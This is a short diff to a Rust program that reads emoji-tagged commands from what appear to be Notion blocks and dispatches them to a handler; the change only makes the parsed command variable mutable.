@@ -135,7 +135,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 Some(s) => {
                     if s.contains("🎯") {
                         logger.info(format!("Got command: {s}"));
-                        let notion_command = NotionCommand::from_string(s.replace("🎯",""))?;
+                        let mut notion_command = NotionCommand::from_string(s.replace("🎯",""))?;
                         let output = notion_command.handle(&mut config_options, &logger).await?;
                         let command_block_id = block["id"].as_str().unwrap();
                         complete_command(&client, block.to_owned(), &logger).await;
